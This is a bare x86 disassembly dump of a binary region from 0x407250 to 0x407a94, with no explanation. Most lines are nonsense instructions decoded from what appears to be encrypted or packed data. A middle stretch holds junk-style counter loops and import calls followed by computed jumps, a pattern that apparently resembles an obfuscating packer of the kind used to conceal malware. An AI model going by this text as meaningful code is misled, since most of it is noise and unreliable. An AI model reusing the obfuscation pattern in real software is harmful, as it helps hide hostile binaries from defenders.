  407250:	addr16 jb 0x407243
  407253:	int3   
  407254:	mov    ds:0x38100393,al
  407259:	pop    ebx
  40725a:	xor    BYTE PTR [eax*8-0x5737a201],dh
  407261:	or     DWORD PTR [eax],0xffffff91
  407264:	or     BYTE PTR [edi+0xd],bh
  407267:	(bad)  
  407268:	ins    DWORD PTR es:[edi],dx
  407269:	push   ss
  40726a:	gs dec ebp
  40726c:	jp     0x40724c
  40726e:	js     0x4072d8
  407270:	push   0x716ac692
  407275:	mov    dh,0x89
  407277:	outs   dx,DWORD PTR ds:[esi]
  407278:	neg    BYTE PTR [esp+eax*4+0xeeafbe3]
  40727f:	out    dx,al
  407280:	mov    BYTE PTR [ebx-0x21],ah
  407283:	cdq    
  407284:	int3   
  407285:	pusha  
  407286:	xor    eax,0x69676b2c
  40728b:	das    
  40728c:	pop    eax
  40728d:	sti    
  40728e:	mov    ah,dh
  407290:	jbe    0x40728b
  407292:	imul   edi,edx,0xf701e6b2
  407298:	pop    ss
  407299:	xor    al,0x7a
  40729b:	add    BYTE PTR [esi-0x5a6a3fce],ch
  4072a1:	cli    
  4072a2:	push   ss
  4072a3:	leave  
  4072a4:	mov    ds:0xc1ad15bd,eax
  4072a9:	lods   eax,DWORD PTR ds:[esi]
  4072aa:	cmp    eax,0xf9fbb538
  4072af:	pushf  
  4072b0:	les    edi,FWORD PTR [ebp+0x59f6f29b]
  4072b6:	and    eax,0xbdb322cf
  4072bb:	pusha  
  4072bc:	inc    ecx
  4072bd:	jo     0x407254
  4072bf:	sbb    ecx,DWORD PTR [ebx+0x5d8be055]
  4072c5:	clc    
  4072c6:	xor    edx,eax
  4072c8:	add    edx,ecx
  4072ca:	imul   edx,ebx
  4072cd:	cmp    edx,edi
  4072cf:	jbe    0x40619a
  4072d5:	pop    ebx
  4072d6:	jmp    0x407428
  4072db:	push   ds
  4072dc:	cld    
  4072dd:	dec    edi
  4072de:	or     ebp,DWORD PTR [ebp-0x27]
  4072e1:	jp     0x40728c
  4072e3:	adc    edi,0x82d30f0c
  4072e9:	in     eax,dx
  4072ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072eb:	clc    
  4072ec:	sbb    BYTE PTR [esi+0x7e],bh
  4072ef:	and    edi,DWORD PTR [edi+0x7e]
  4072f2:	jle    0x407288
  4072f4:	or     DWORD PTR [esi+0x11a40c32],ebp
  4072fa:	adc    BYTE PTR [edx],dh
  4072fc:	(bad)  
  4072fe:	ja     0x40732d
  407300:	pop    ds
  407301:	pusha  
  407302:	sbb    al,0x8c
  407304:	nop
  407305:	inc    edi
  407306:	lods   al,BYTE PTR ds:[esi]
  407307:	push   ebx
  407308:	mov    ds,WORD PTR [eax+0xa]
  40730b:	pop    ebp
  40730c:	jno    0x40737d
  40730e:	sbb    bh,BYTE PTR [esi-0x76ca3990]
  407314:	add    BYTE PTR [edx-0x153848a3],0xce
  40731b:	push   esi
  40731c:	clc    
  40731d:	mov    dh,0x41
  40731f:	add    DWORD PTR [edx-0x62],esp
  407322:	xchg   ecx,eax
  407323:	sub    eax,edi
  407325:	mov    ebp,0xa7de5aef
  40732a:	adc    ebx,DWORD PTR [edx-0x2c789e40]
  407330:	jb     0x407321
  407332:	mov    edx,0x974f9e5d
  407337:	outs   dx,DWORD PTR ds:[esi]
  407338:	loopne 0x407304
  40733a:	in     al,dx
  40733b:	fbstp  TBYTE PTR [ecx-0x9c1de37]
  407341:	adc    esi,0x67
  407344:	aam    0xd7
  407346:	mov    BYTE PTR [ecx],bl
  407348:	js     0x40733e
  40734a:	loopne 0x4072f4
  40734c:	jmp    0x407301
  40734e:	enter  0x4395,0xfa
  407352:	adc    BYTE PTR [ebx],bh
  407354:	pop    eax
  407355:	push   esi
  407356:	xor    ch,BYTE PTR [esi]
  407358:	cmp    eax,edi
  40735a:	mov    ds:0x693f570,eax
  40735f:	xchg   edx,eax
  407360:	(bad)  
  407361:	pop    ss
  407362:	inc    edi
  407363:	pop    esi
  407364:	pop    edi
  407365:	mov    esp,edx
  407367:	mov    BYTE PTR [edi+0x9ef4630],al
  40736d:	and    DWORD PTR [ecx],eax
  40736f:	cmp    eax,0x9d52b4e4
  407374:	mov    al,ds:0x5bbe63fc
  407379:	scas   al,BYTE PTR es:[edi]
  40737a:	pushf  
  40737b:	or     ah,bh
  40737d:	fidiv  DWORD PTR [eax+0x174db7a2]
  407383:	add    dh,bl
  407385:	xchg   DWORD PTR [eax+0x73],ebx
  407388:	mov    dh,0x8
  40738a:	jb     0x4073f9
  40738c:	inc    eax
  40738d:	sub    esi,DWORD PTR [esi]
  40738f:	cmp    edi,DWORD PTR [edx-0x4c0547ad]
  407395:	xchg   ebp,eax
  407396:	inc    edi
  407397:	and    ecx,ebx
  407399:	mov    ecx,0x83da9e30
  40739e:	push   edi
  40739f:	out    dx,al
  4073a0:	in     al,0x92
  4073a2:	shl    BYTE PTR [edx],1
  4073a4:	inc    ebx
  4073a5:	xchg   ebp,eax
  4073a6:	dec    edi
  4073a7:	mov    ds,esi
  4073a9:	add    eax,0x523281a4
  4073ae:	jle    0x407391
  4073b0:	lock adc al,0xf7
  4073b3:	out    dx,al
  4073b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073b5:	iret   
  4073b6:	dec    eax
  4073b7:	jle    0x40742a
  4073b9:	mov    bh,0xee
  4073bb:	pop    ds
  4073bc:	clc    
  4073bd:	sbb    bl,al
  4073bf:	jl     0x4073f2
  4073c1:	leave  
  4073c2:	cmp    BYTE PTR [edi-0x35],cl
  4073c5:	xlat   BYTE PTR ds:[ebx]
  4073c6:	mov    ch,0x8a
  4073c8:	das    
  4073c9:	and    eax,0x3af7b338
  4073ce:	pop    ebx
  4073cf:	retf   0xc517
  4073d2:	fbstp  TBYTE PTR [ecx]
  4073d4:	sbb    BYTE PTR [ebp-0x315b653c],0x26
  4073db:	imul   ecx,DWORD PTR [esi+ebp*2+0x4],0x2f
  4073e0:	fsub   DWORD PTR [ebp-0x45f76eb3]
  4073e6:	mov    edx,0xc31edb37
  4073eb:	mov    eax,0x5064af2b
  4073f0:	sub    DWORD PTR [edx],edi
  4073f2:	adc    al,BYTE PTR [edx+edx*1]
  4073f5:	or     ecx,ebp
  4073f7:	cmp    al,0x22
  4073f9:	mov    dh,BYTE PTR [ecx-0x4904b39e]
  4073ff:	pop    ebp
  407400:	xor    bl,BYTE PTR [eax+0x70]
  407403:	push   esp
  407404:	jbe    0x4073fb
  407406:	mov    edi,0xc57370d9
  40740b:	idiv   DWORD PTR [edi-0xf]
  40740e:	inc    edi
  40740f:	push   edi
  407410:	test   al,0x28
  407412:	(bad)  
  407414:	mov    esp,0xf175583a
  407419:	adc    esi,DWORD PTR [ebx-0x50]
  40741c:	dec    ecx
  40741d:	retf   
  40741e:	sbb    DWORD PTR [ebp+0x5958bbdf],ecx
  407424:	sub    cl,BYTE PTR [ebx-0x36a0d09c]
  40742a:	ret    0x8
  40742d:	push   ebp
  40742e:	mov    ebp,esp
  407430:	jmp    0x4075bc
  407435:	jb     0x407447
  407437:	test   eax,0x8a95a91d
  40743c:	adc    DWORD PTR [ebp+eax*1+0x779027ff],edi
  407443:	in     eax,dx
  407444:	or     eax,0x7e7e19ad
  407449:	jmp    0x69bef2cd
  40744e:	(bad)  
  40744f:	add    edx,DWORD PTR gs:[edx-0x53668da3]
  407456:	test   al,0xd5
  407458:	jg     0x4073f7
  40745a:	pusha  
  40745b:	scas   al,BYTE PTR es:[edi]
  40745c:	pop    esp
  40745d:	add    eax,0xbcdc590a
  407462:	and    DWORD PTR [eax],esp
  407464:	sbb    DWORD PTR [esi+0x4c],ecx
  407467:	(bad)  
  407469:	push   cs
  40746a:	mov    al,BYTE PTR ds:0xa24ac825
  407470:	dec    edx
  407471:	pop    edx
  407472:	enter  0xddf8,0x74
  407476:	test   BYTE PTR [ebp-0x64],bh
  407479:	cmp    ecx,edx
  40747b:	test   al,0x6e
  40747d:	push   ebp
  40747e:	in     al,dx
  40747f:	push   edx
  407480:	mov    WORD PTR [esi-0x57f86bc0],gs
  407486:	cmp    DWORD PTR [edx],ecx
  407488:	(bad)  
  40748a:	stos   DWORD PTR es:[edi],eax
  40748b:	cmc    
  40748c:	repnz mov esi,0x17c9c25e
  407492:	lahf   
  407493:	repz mov ds,edx
  407496:	xor    dh,BYTE PTR [eax-0x61dadc76]
  40749c:	fnstsw WORD PTR [ebp+ebp*8+0x5c]
  4074a0:	push   esp
  4074a1:	ror    BYTE PTR [edx-0x30],0x58
  4074a5:	dec    eax
  4074a6:	xlat   BYTE PTR ds:[ebx]
  4074a7:	jo     0x407479
  4074a9:	jmp    0x407515
  4074ab:	sub    eax,0x736d9ba9
  4074b0:	popf   
  4074b1:	push   0xce069237
  4074b6:	sub    bh,cl
  4074b8:	jecxz  0x4074e0
  4074ba:	sub    edi,DWORD PTR [edx-0x2]
  4074bd:	fsub   QWORD PTR [ecx+0x57]
  4074c0:	fcom   QWORD PTR [ebx+0x33]
  4074c3:	hlt    
  4074c4:	out    0xef,eax
  4074c6:	hlt    
  4074c7:	jl     0x4074f7
  4074c9:	cmp    bl,dl
  4074cb:	jg     0x4074c7
  4074cd:	div    BYTE PTR [esi-0x2a]
  4074d0:	jmp    0x7de0f36a
  4074d5:	sub    BYTE PTR [esi+0x4b],bl
  4074d8:	mov    cl,0x1c
  4074da:	push   edx
  4074db:	cdq    
  4074dc:	jae    0x407537
  4074de:	xchg   edx,eax
  4074df:	out    dx,eax
  4074e0:	das    
  4074e1:	pop    edi
  4074e2:	mov    BYTE PTR [eax],dl
  4074e4:	sub    eax,ebx
  4074e6:	jg     0x40752d
  4074e8:	dec    edx
  4074e9:	mov    al,0xe5
  4074eb:	or     DWORD PTR [eax],esp
  4074ed:	sbb    BYTE PTR [ebx-0x19],al
  4074f0:	jae    0x407499
  4074f2:	sub    bh,BYTE PTR [ecx-0x5c]
  4074f5:	mul    DWORD PTR [esi+0x3c195588]
  4074fb:	push   ebx
  4074fc:	mov    ss,WORD PTR [edx+0x2c]
  4074ff:	mov    eax,0xd165e674
  407504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407505:	jge    0x4074c2
  407507:	out    0x29,eax
  407509:	mov    esp,0x19a04c36
  40750e:	push   ebp
  40750f:	ret    
  407510:	in     eax,0x43
  407512:	mov    edx,ecx
  407514:	push   ebp
  407515:	mov    esp,0xe6e1344a
  40751a:	push   ecx
  40751b:	dec    edx
  40751c:	inc    ecx
  40751d:	ret    
  40751e:	ja     0x407527
  407520:	lock dec ecx
  407522:	inc    edx
  407523:	mov    dh,0xab
  407525:	dec    edx
  407526:	rcl    al,cl
  407528:	cmp    eax,DWORD PTR [ebx]
  40752a:	in     al,0x15
  40752c:	and    eax,0xbf3c13e4
  407531:	aam    0xc1
  407533:	jl     0x40751f
  407535:	iret   
  407536:	dec    ecx
  407537:	mov    esp,0x3c9b76a9
  40753c:	out    0x38,eax
  40753e:	adc    BYTE PTR [esp+ebp*2+0x1720d08a],dh
  407545:	retf   0xf678
  407548:	sbb    BYTE PTR [eax-0x5d6cc7c8],cl
  40754e:	and    eax,0xb789e25e
  407553:	les    ebx,FWORD PTR [ecx-0x405ba72e]
  407559:	out    0x8b,eax
  40755b:	jo     0x407592
  40755d:	fsub   QWORD PTR [ebx+0x70]
  407560:	std    
  407561:	(bad)  
  407562:	dec    edi
  407563:	pop    ss
  407564:	jo     0x4075c1
  407566:	inc    ebp
  407567:	std    
  407568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407569:	out    dx,al
  40756a:	imul   edi,DWORD PTR [ebx-0x6696b5d8],0x6d
  407571:	sub    eax,0x3d130304
  407576:	push   edi
  407577:	sbb    esp,0x6d04393c
  40757d:	mov    BYTE PTR [eax],cl
  40757f:	and    ch,BYTE PTR fs:[esi]
  407582:	sbb    esp,esi
  407584:	icebp  
  407585:	cmp    eax,0x7dbd02b1
  40758a:	into   
  40758b:	and    bl,BYTE PTR [ecx]
  40758d:	jno    0x40753c
  40758f:	bound  esp,QWORD PTR [eax]
  407591:	ficom  WORD PTR [eax+ebp*1+0x98fa838]
  407598:	add    eax,0xbc92cf2c
  40759d:	fdiv   DWORD PTR [esi]
  40759f:	inc    ebp
  4075a0:	mov    al,ds:0xb0e6a549
  4075a5:	lods   al,BYTE PTR ds:[esi]
  4075a6:	mov    bl,0x58
  4075a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075a9:	push   esi
  4075aa:	or     eax,0xd65942ef
  4075af:	mov    ebp,cs
  4075b1:	xchg   edx,eax
  4075b2:	sub    al,0x59
  4075b4:	xchg   BYTE PTR [esi+0x58],dh
  4075b7:	lahf   
  4075b8:	outs   dx,BYTE PTR ds:[esi]
  4075b9:	nop
  4075ba:	cmp    eax,0x8151517d
  4075bf:	and    eax,0x41abce
  4075c4:	add    BYTE PTR [eax],al
  4075c6:	add    BYTE PTR [eax],al
  4075c8:	jmp    0x4075da
  4075cd:	mov    edx,DWORD PTR ds:0x41abce
  4075d3:	inc    edx
  4075d4:	mov    DWORD PTR ds:0x41abce,edx
  4075da:	cmp    DWORD PTR ds:0x41abce,0x1e
  4075e1:	jae    0x407619
  4075e7:	cmp    DWORD PTR ds:0x41abce,0x20
  4075ee:	jne    0x40760a
  4075f4:	push   DWORD PTR [ebp-0x28]
  4075f7:	push   0x365e
  4075fc:	push   DWORD PTR [ebp-0x18]
  4075ff:	push   0x4c62
  407604:	call   DWORD PTR ds:0x40d004
  40760a:	jmp    0x4075cd
  40760f:	xor    DWORD PTR ds:0x412374,0x3a52
  407619:	mov    eax,0xf89c8538
  40761e:	sub    ecx,ecx
  407620:	mov    DWORD PTR [ebp-0x8],eax
  407623:	and    DWORD PTR ds:0x41abd6,0x0
  40762d:	jmp    0x40763f
  407632:	mov    ecx,DWORD PTR ds:0x41abd6
  407638:	inc    ecx
  407639:	mov    DWORD PTR ds:0x41abd6,ecx
  40763f:	cmp    DWORD PTR ds:0x41abd6,0x1e
  407646:	jae    0x4076c6
  40764c:	cmp    DWORD PTR ds:0x41abd6,0x2d
  407653:	jne    0x40765f
  407659:	call   DWORD PTR ds:0x40d1d8
  40765f:	jmp    0x407632
  407664:	and    DWORD PTR ds:0x417e45,0x0
  40766e:	jmp    0x407680
  407673:	mov    edx,DWORD PTR ds:0x417e45
  407679:	inc    edx
  40767a:	mov    DWORD PTR ds:0x417e45,edx
  407680:	cmp    DWORD PTR ds:0x417e45,0x1b
  407687:	jae    0x4076c6
  40768d:	cmp    DWORD PTR ds:0x417e45,0x8
  407694:	jne    0x4076a5
  40769a:	push   0x41abea
  40769f:	call   DWORD PTR ds:0x40d1dc
  4076a5:	cmp    DWORD PTR ds:0x417e45,0x7
  4076ac:	jne    0x4076c1
  4076b2:	xor    edx,edx
  4076b4:	add    edx,DWORD PTR ds:0x417e45
  4076ba:	inc    edx
  4076bb:	mov    DWORD PTR ds:0x417e45,edx
  4076c1:	jmp    0x407673
  4076c6:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  4076cd:	mov    edx,DWORD PTR [ebp-0x8]
  4076d0:	push   esi
  4076d1:	adc    esi,ecx
  4076d3:	mov    ecx,0x7510859
  4076d8:	xor    edx,ecx
  4076da:	mov    esi,0x32729f
  4076df:	push   edi
  4076e0:	mov    edi,DWORD PTR [ebp+0x10]
  4076e3:	add    edx,esi
  4076e5:	cmp    edi,edx
  4076e7:	jmp    0x407873
  4076ec:	iret   
  4076ed:	in     eax,0x74
  4076ef:	push   edx
  4076f0:	adc    al,0x63
  4076f2:	jns    0x40776d
  4076f4:	int    0x3e
  4076f6:	les    ebp,FWORD PTR [esi-0x59]
  4076f9:	xchg   edx,eax
  4076fa:	inc    ecx
  4076fb:	ja     0x407719
  4076fd:	pop    ds
  4076fe:	jle    0x40777e
  407700:	jmp    0xe4bef584
  407705:	add    eax,0x5efb8ae3
  40770a:	fsub   QWORD PTR [edi+0x35]
  40770d:	inc    ecx
  40770e:	ins    BYTE PTR es:[edi],dx
  40770f:	add    ah,bl
  407711:	lock mov WORD PTR [ebp+0x40582f1c],ss
  407718:	aaa    
  407719:	mov    esi,0x6cab3d47
  40771e:	and    DWORD PTR [eax],0x32
  407721:	mov    eax,ebp
  407723:	gs inc eax
  407725:	sbb    al,0x92
  407727:	scas   al,BYTE PTR es:[edi]
  407728:	in     eax,dx
  407729:	mov    BYTE PTR [ebx+0x15d0c4d6],dh
  40772f:	inc    ecx
  407730:	sub    BYTE PTR [esi+0x43],bh
  407733:	clc    
  407734:	jno    0x407726
  407736:	push   es
  407737:	add    BYTE PTR [eax],bl
  407739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40773a:	dec    edi
  40773b:	adc    eax,0xffcf7d5a
  407740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407741:	xor    edx,ebx
  407743:	jo     0x407708
  407745:	or     eax,DWORD PTR [ebx+0x72]
  407748:	jne    0x4076d4
  40774a:	loope  0x4077ae
  40774c:	and    DWORD PTR [eax+0x524c2c7f],0x1c
  407753:	xor    eax,0xed6510df
  407758:	pop    ebp
  407759:	stos   DWORD PTR es:[edi],eax
  40775a:	xchg   ecx,eax
  40775b:	int    0xdb
  40775d:	ins    BYTE PTR es:[edi],dx
  40775e:	add    eax,0x142ce88f
  407763:	mov    ebx,0xefe10c83
  407768:	add    edi,DWORD PTR [ebp+esi*1+0x67]
  40776c:	push   edx
  40776d:	es mov ebx,0x8d85e589
  407773:	mov    ss,WORD PTR ds:0x7b46620b
  407779:	xchg   BYTE PTR [ebx-0x38f6b9dd],bl
  40777f:	and    BYTE PTR [edx-0x3585061f],0xd3
  407786:	xor    BYTE PTR [eax+edi*1-0x5f083531],0xe9
  40778e:	xchg   DWORD PTR [ebx],esi
  407790:	add    DWORD PTR [edx+0x73],esp
  407793:	sbb    al,0x16
  407795:	pop    ecx
  407796:	inc    ebx
  407797:	popf   
  407798:	xchg   BYTE PTR [ebp-0x1ffb323d],bl
  40779e:	ds mov esi,fs
  4077a1:	out    dx,al
  4077a2:	add    al,0x6c
  4077a4:	pop    esp
  4077a5:	lahf   
  4077a6:	inc    esi
  4077a7:	or     edi,0xffffffcc
  4077aa:	pop    ds
  4077ab:	popf   
  4077ac:	sub    al,0xf
  4077ae:	cmp    eax,0x969b1f5
  4077b3:	(bad)  
  4077b4:	lods   al,BYTE PTR ds:[esi]
  4077b5:	outs   dx,DWORD PTR ds:[esi]
  4077b6:	sbb    DWORD PTR [ecx+ebp*4],edx
  4077b9:	(bad)  
  4077ba:	fdiv   QWORD PTR [ebx+0x78e0f669]
  4077c0:	mov    bh,0x33
  4077c2:	xchg   esi,eax
  4077c3:	loopne 0x40780b
  4077c5:	out    0xc8,al
  4077c7:	jno    0x40776a
  4077c9:	xor    cl,ch
  4077cb:	mov    edx,0x2c50f2db
  4077d0:	dec    ebp
  4077d1:	push   edi
  4077d2:	rcl    BYTE PTR [eax],1
  4077d4:	inc    eax
  4077d5:	jb     0x40776c
  4077d7:	inc    edx
  4077d8:	jmp    0xbcf53e2
  4077dd:	and    esi,DWORD PTR [ebx+0x6738d9b4]
  4077e3:	xor    ch,BYTE PTR [ebx+0x66]
  4077e6:	mov    edx,0x74467ec0
  4077eb:	dec    edx
  4077ec:	rcl    DWORD PTR [esi-0x65438627],1
  4077f2:	or     DWORD PTR [ecx],esp
  4077f4:	cmp    eax,DWORD PTR [esi+0x1d]
  4077f7:	(bad)  
  4077f8:	lock popf 
  4077fa:	mov    ecx,0x9c413128
  4077ff:	(bad)  
  407801:	int    0x25
  407803:	push   ebx
  407804:	in     eax,dx
  407805:	bound  eax,QWORD PTR [esi+ebx*8-0x7a013370]
  40780c:	mov    edi,0x8d72ca7b
  407811:	(bad)  
  407812:	lods   eax,DWORD PTR es:[esi]
  407814:	in     al,dx
  407815:	xchg   edi,eax
  407816:	mov    cl,0x14
  407818:	xchg   edx,eax
  407819:	pop    ss
  40781a:	iret   
  40781b:	sub    BYTE PTR [eax],0x13
  40781e:	retf   
  40781f:	or     bl,BYTE PTR [edx-0x50]
  407822:	inc    ecx
  407823:	fcmovu st,st(5)
  407825:	or     DWORD PTR [esi],esi
  407827:	in     al,0x10
  407829:	mov    eax,0x18ec44d4
  40782e:	dec    esp
  40782f:	int3   
  407830:	jae    0x407833
  407832:	mov    ebx,0x77bb36cc
  407837:	or     DWORD PTR [ecx+0x6e],eax
  40783a:	pop    ebx
  40783b:	je     0x4078b4
  40783d:	and    eax,0xcf4fb3f7
  407842:	inc    esp
  407843:	fcmovu st,st(3)
  407845:	stc    
  407846:	mov    ebx,0xaff6fb75
  40784b:	sbb    esi,DWORD PTR [edi+0x62]
  40784e:	pop    edx
  40784f:	and    al,0x8c
  407851:	or     al,0x52
  407853:	sbb    ecx,DWORD PTR [ebp+0x38]
  407856:	es mov ecx,edx
  407859:	je     0x407899
  40785b:	pushf  
  40785c:	dec    ebp
  40785d:	mov    ch,0x71
  40785f:	and    DWORD PTR [eax+0x40722548],ebx
  407865:	dec    edx
  407866:	popf   
  407867:	sub    eax,0xe5d34761
  40786c:	ja     0x407823
  40786e:	jmp    0x407882
  407870:	hlt    
  407871:	icebp  
  407872:	or     al,0xf
  407874:	test   BYTE PTR [ebx-0x16fffffd],cl
  40787a:	xchg   DWORD PTR [ecx],eax
  40787c:	add    BYTE PTR [eax],al
  40787e:	in     eax,dx
  40787f:	(bad)  
  407880:	pop    esi
  407881:	jg     0x4078d7
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	ins    DWORD PTR es:[edi],dx
  407885:	in     eax,0x5e
  407887:	imul   eax,DWORD PTR [esi+0x66fa4a8c],0xffffff83
  40788e:	(bad)  
  40788f:	sbb    al,0x7e
  407891:	jle    0x40787c
  407893:	jg     0x407913
  407895:	jle    0x4078ec
  407897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407898:	sbb    BYTE PTR [eax-0x3f83b329],bl
  40789e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40789f:	jo     0x40789c
  4078a1:	inc    esp
  4078a2:	xor    dh,BYTE PTR [ebx]
  4078a4:	mov    dh,0x70
  4078a6:	loopne 0x4078e6
  4078a8:	iret   
  4078a9:	gs cmc 
  4078ab:	int3   
  4078ac:	ja     0x40792d
  4078ae:	push   esp
  4078af:	sbb    al,0x36
  4078b1:	dec    edi
  4078b2:	lods   al,BYTE PTR ds:[esi]
  4078b3:	push   ss
  4078b4:	inc    eax
  4078b5:	ja     0x40789f
  4078b7:	test   eax,0xc6df2b71
  4078bc:	aas    
  4078bd:	dec    ebx
  4078be:	push   es
  4078bf:	(bad)
  4078c3:	call   DWORD PTR [edi]
  4078c5:	lea    eax,[eax]
  4078c7:	push   es
  4078c8:	fisttp QWORD PTR ds:0x2618f8a1
  4078ce:	pusha  
  4078cf:	mov    eax,ds:0x40c280c2
  4078d4:	in     al,dx
  4078d5:	xchg   ebp,eax
  4078d6:	mov    edx,0x4ad8f276
  4078db:	pop    esp
  4078dc:	mov    BYTE PTR [esi+0x6cf228be],bh
  4078e2:	addr16 ret 0x2b07
  4078e6:	mov    ds:0xaf29cc36,eax
  4078eb:	cmp    BYTE PTR [ebx+0x25],bl
  4078ee:	pushf  
  4078ef:	pusha  
  4078f0:	fs inc ecx
  4078f2:	cmp    cl,0xa
  4078f5:	jl     0x407964
  4078f7:	aam    0x39
  4078f9:	cli    
  4078fa:	pop    eax
  4078fb:	pop    esi
  4078fc:	push   cs
  4078fd:	mov    bl,0x2b
  4078ff:	adc    cl,BYTE PTR [edx+0x22122658]
  407905:	ret    
  407906:	xor    eax,0x69f06ea8
  40790b:	repz and al,0x8b
  40790e:	jne    0x4078a4
  407910:	in     eax,dx
  407911:	cmp    dl,BYTE PTR [ebp+ebx*4-0x4e034e02]
  407918:	fdiv   QWORD PTR [edi-0xe]
  40791b:	mov    al,ds:0x4d29305f
  407920:	mov    eax,0xcc9cf412
  407925:	and    edx,DWORD PTR [edi]
  407927:	mov    BYTE PTR [ebx+ecx*8],dl
  40792a:	mov    bh,0xa7
  40792c:	xlat   BYTE PTR ds:[ebx]
  40792d:	pop    ss
  40792e:	ficomp DWORD PTR [edx+0x22]
  407931:	pop    ds
  407932:	outs   dx,DWORD PTR ds:[esi]
  407933:	and    DWORD PTR [esi+0x47],0x4e3a109b
  40793a:	adc    al,0x26
  40793c:	mov    eax,0x3ed69979
  407941:	adc    eax,0x6686ec25
  407946:	mov    ah,al
  407948:	stos   BYTE PTR es:[edi],al
  407949:	popa   
  40794a:	enter  0x44b2,0xeb
  40794e:	mov    bh,0x16
  407950:	push   esp
  407951:	imul   ebx,DWORD PTR [edx-0x530f06d8],0x16
  407958:	xchg   esp,eax
  407959:	mov    bl,0x3c
  40795b:	or     esp,eax
  40795d:	aam    0x74
  40795f:	jg     0x4079c5
  407961:	jnp    0x4078f5
  407963:	popf   
  407964:	daa    
  407965:	(bad)  
  407967:	push   ebx
  407968:	xchg   ebp,ebx
  40796a:	cmp    eax,0x976bfbdc
  40796f:	sub    al,0x8b
  407971:	int3   
  407972:	push   edi
  407973:	dec    esi
  407974:	fidiv  DWORD PTR [ebx+0x14]
  407977:	sub    ebp,DWORD PTR [ecx]
  407979:	arpl   dx,dx
  40797b:	xchg   ebp,eax
  40797c:	pop    ds
  40797d:	sub    dh,BYTE PTR [esi+0x1d]
  407980:	fadd   QWORD PTR [ebx+0x517db582]
  407986:	shl    BYTE PTR [eax],0x21
  407989:	pusha  
  40798a:	sub    BYTE PTR ds:0x5d5ffa98,dl
  407990:	jmp    0x12f1c44a
  407995:	and    dh,BYTE PTR [esi+0x7a]
  407998:	pop    ecx
  407999:	sbb    esp,DWORD PTR [ebp+0x70]
  40799c:	daa    
  40799d:	cwde   
  40799e:	sub    al,0xdf
  4079a0:	inc    ebx
  4079a1:	retf   0xb09e
  4079a4:	add    ebp,edi
  4079a6:	cmp    eax,edi
  4079a8:	xchg   edx,eax
  4079a9:	mov    edx,0xf17d86bf
  4079ae:	int    0xa
  4079b0:	fld    DWORD PTR [ebx+0x45]
  4079b3:	sahf   
  4079b4:	jmp    0xb709:0x8f12ae63
  4079bb:	push   esi
  4079bd:	dec    esi
  4079be:	out    0x3f,al
  4079c0:	pop    ecx
  4079c1:	ins    BYTE PTR es:[edi],dx
  4079c2:	mov    ss,WORD PTR [esi-0x73]
  4079c5:	mov    edi,0xf05248e0
  4079ca:	mov    cl,0x84
  4079cc:	jns    0x4079ce
  4079ce:	mov    WORD PTR [eax+0x64b63146],es
  4079d4:	xchg   esp,eax
  4079d5:	inc    esp
  4079d6:	cmp    DWORD PTR [edi],ebx
  4079d8:	pop    es
  4079d9:	jae    0x407a09
  4079db:	pop    ss
  4079dc:	add    DWORD PTR [edi-0x65994fad],ebx
  4079e2:	fnstcw WORD PTR [eax]
  4079e4:	push   edx
  4079e5:	pop    ecx
  4079e6:	lea    esp,[esp+edx*1]
  4079e9:	sti    
  4079ea:	test   al,0xa2
  4079ec:	dec    BYTE PTR [esi-0x3cccccae]
  4079f2:	aad    0x59
  4079f4:	jne    0x4079d8
  4079f6:	aam    0x6c
  4079f8:	out    dx,al
  4079f9:	pop    ebx
  4079fa:	pop    ds
  4079fb:	cdq    
  4079fc:	ds dec ecx
  4079fe:	mov    esi,0x51f042d2
  407a03:	pop    esi
  407a04:	stos   BYTE PTR es:[edi],al
  407a05:	mov    edx,DWORD PTR [ebp-0x8]
  407a08:	mov    eax,DWORD PTR [ebp-0x4]
  407a0b:	xor    eax,ecx
  407a0d:	mov    edi,0xffcd8d61
  407a12:	sub    edi,eax
  407a14:	jmp    0x407ba0
  407a19:	les    edi,FWORD PTR [eax]
  407a1b:	add    ch,BYTE PTR [edi-0x1e]
  407a1e:	gs jns 0x4079da
  407a21:	dec    esp
  407a22:	hlt    
  407a23:	sbb    BYTE PTR [ecx+0x4c],0xe9
  407a27:	mov    ebx,0x7e127e54
  407a2c:	jle    0x407a17
  407a2e:	jg     0x407aae
  407a30:	jle    0x4079da
  407a32:	test   ch,dh
  407a34:	jb     0x407a51
  407a36:	lahf   
  407a37:	ror    DWORD PTR [edi+0x3c],0xb3
  407a3b:	inc    eax
  407a3c:	lea    esi,ds:0x93c1b6ff
  407a42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a43:	adc    eax,0x5452405f
  407a48:	xlat   BYTE PTR ds:[ebx]
  407a49:	les    ebp,FWORD PTR [edi+0xf]
  407a4c:	ins    BYTE PTR es:[edi],dx
  407a4d:	sub    al,0x7e
  407a4f:	mov    dh,0x3a
  407a51:	mov    bh,0xc5
  407a53:	(bad)  
  407a54:	jle    0x407a81
  407a56:	sub    al,0x74
  407a58:	dec    ebp
  407a59:	loop   0x407a4b
  407a5b:	lea    ecx,ds:0xcc3acaac
  407a61:	into   
  407a62:	adc    DWORD PTR [ebp+0x28b25808],0xffffff9b
  407a69:	fwait
  407a6a:	inc    esp
  407a6b:	mov    bh,0xd4
  407a6d:	out    0x87,eax
  407a6f:	ret    
  407a70:	mov    esi,0x20c6b22b
  407a75:	icebp  
  407a76:	in     al,dx
  407a77:	sub    ebp,DWORD PTR [ecx+0x5]
  407a7a:	mov    bh,0x42
  407a7c:	xchg   ebp,eax
  407a7d:	outs   dx,DWORD PTR ss:[esi]
  407a7f:	add    DWORD PTR [edx],edi
  407a81:	xchg   esp,eax
  407a82:	enter  0xa0c1,0x93
  407a86:	pop    ebp
  407a87:	cmp    al,0xae
  407a89:	mov    ebx,0x652c82b8
  407a8e:	pop    ebp
  407a8f:	push   ebp
  407a90:	dec    edi
  407a91:	xchg   ebx,eax
  407a92:	adc    ebp,esi
  407a94:	adc    al,0x7e
